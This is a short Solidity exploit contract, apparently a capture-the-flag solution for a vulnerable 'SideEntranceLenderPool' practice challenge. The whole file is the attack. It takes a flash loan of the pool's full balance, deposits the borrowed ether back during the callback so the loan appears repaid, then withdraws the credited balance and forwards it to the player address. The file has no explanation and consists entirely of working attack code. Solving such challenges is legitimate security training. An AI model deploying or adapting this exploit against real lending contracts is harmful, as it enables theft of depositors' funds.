// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract HackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    function hack(address payable player) public returns (bool) {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success, ) = player.call{value: address(this).balance}("");
        return success;
    }

    receive() external payable {}
}
